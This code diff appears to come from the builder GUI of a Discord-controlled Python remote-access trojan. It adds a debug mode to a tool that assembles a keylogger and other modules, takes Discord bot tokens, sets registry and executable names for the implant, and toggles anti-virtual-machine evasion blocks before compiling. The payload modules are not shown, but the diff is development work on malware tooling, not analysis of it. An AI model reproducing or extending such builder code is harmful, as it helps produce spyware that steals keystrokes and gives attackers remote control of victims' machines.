@@ -2,6 +2,7 @@ from tkinter import *
 from tkinter import filedialog
 from PIL import ImageTk, Image
 import configparser
+import shutil
 import compiler
 import sys
 import os
@@ -11,6 +12,7 @@ window_icon = 'resources/icons/icon.ico'; Image.open('resources/icons/icon.ico')
 config_path, status = 'configuration.ini', 'configuration'
 config = configparser.ConfigParser()
 config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
+debug_mode = False
 
 filenames = {
     'keylogr': 'keylogger.py',
@@ -174,6 +176,17 @@ def disclaimer_toggle():
         config_modification()
         generate_source_btn['state'] = DISABLED
 
+def debug_toggle():
+    global debug_mode
+    if not debug_mode:
+        debug_mode_btn['text'] = 'Debug mode [ON]'
+        debug_mode_btn['fg'] = 'white'
+        debug_mode = True
+    else:
+        debug_mode_btn['text'] = 'Debug mode [OFF]'
+        debug_mode_btn['fg'] = 'gray'
+        debug_mode = False
+
 def assemble_source_code():
     global source_code_modifiers, status, config_path
     
@@ -194,6 +207,21 @@ def assemble_source_code():
     save_configuration()
     config = configparser.ConfigParser(); config.read(config_path)
 
+    try: shutil.rmtree('resources/source_code/tmp')
+    except: pass
+    os.mkdir('resources/source_code/tmp')
+    for file in filenames.keys():
+        shutil.copy(f'resources/source_code/{filenames[file]}', f'resources/source_code/tmp/{filenames[file]}')
+        with open(f'resources/source_code/tmp/{filenames[file]}', 'r', encoding='utf-8') as get_raw_source:
+            source_unlogged = get_raw_source.readlines()
+        with open(f'resources/source_code/{filenames[file]}', 'w', encoding='utf-8') as log_source:
+            for line_number, line in enumerate(source_unlogged):
+                if len(line.lstrip()) > 0:
+                    if line.lstrip()[:6] == '#.log ':
+                        log_source.write(' '*(len(line)-len(line.lstrip()))+f'{line.lstrip()[:-1]}({filenames[file]}:{line_number})*\n')
+                    else:
+                        log_source.write(line)
+    
     for individual_functionality in config['FUNCTIONALITY'].keys():
         if config['FUNCTIONALITY'][individual_functionality] == 'True':
             with open('resources/source_code/' + filenames[individual_functionality], 'r', encoding='utf-8') as copy_function:
@@ -226,9 +254,16 @@ def assemble_source_code():
                     else: source_assembled.write('\n')
                     if base_line == '# [pysilon_var] bottom 0\n' and config['FUNCTIONALITY']['keylogr'] == 'False':
                         source_assembled.write('for token in bot_tokens:\n    try:\n        client.run(token)\n    except: pass')
+                elif '# [pysilon_mark] !debug' in base_line and not debug_mode: pass
+                elif '# [pysilon_mark] !anti-vm' in base_line and debug_mode: pass
                 else:
                     source_assembled.write(base_line)
     
+    for file in filenames.keys():
+        os.system(f'del resources\\source_code\\{filenames[file]}')
+        shutil.copy(f'resources/source_code/tmp/{filenames[file]}', f'resources/source_code/{filenames[file]}')
+    shutil.rmtree('resources/source_code/tmp')
+
     generate_source_btn['state'] = DISABLED
     generate_source_btn['text'] = 'Source generated'
     if status != 'compiled': compile_btn['state'] = NORMAL
@@ -248,7 +283,7 @@ def change_icon(path=False):
     config_modification()
 
 def compile_source():
-    global status
+    global status, debug_mode
     custom_imports = configparser.ConfigParser()
     custom_imports.read('resources/custom_imports.ini')
     with open('custom_imports.txt', 'w') as imports_file:
@@ -261,7 +296,7 @@ def compile_source():
         for general_packages in custom_imports['general'].keys():
             imports_file.write(custom_imports['general'][general_packages] + '\n')
 
-    response = compiler.compile()
+    response = compiler.compile(debug_mode)
     compile_btn['state'] = DISABLED
     status = 'compiled'
 
@@ -307,6 +342,9 @@ else:
     icon_btn = Button(settings_canvas, image=icon_photo, state=NORMAL, width=120, height=120, command=change_icon)
     icon_btn.grid(row=10, column=1, pady=2, sticky=NW, rowspan=6)
 
+    debug_mode_btn = Button(settings_canvas, text='Debug mode [OFF]', fg='gray', state=NORMAL, width=12, height=1, command=debug_toggle)
+    debug_mode_btn.grid(row=15, column=1, padx=(5, 5), pady=10, sticky=NSEW, rowspan=2)
+
     var_server_id = StringVar()
     var_bot_token_1 = StringVar()
     var_bot_token_2 = StringVar()
@@ -321,6 +359,7 @@ else:
     registry_name = Entry(settings_canvas, textvariable=var_registry_name)
     directory_name = Entry(settings_canvas, textvariable=var_directory_name)
     executable_name = Entry(settings_canvas, textvariable=var_executable_name)
+    
 
     var_server_id.trace_add("write", config_modification)
     var_bot_token_1.trace_add("write", config_modification)
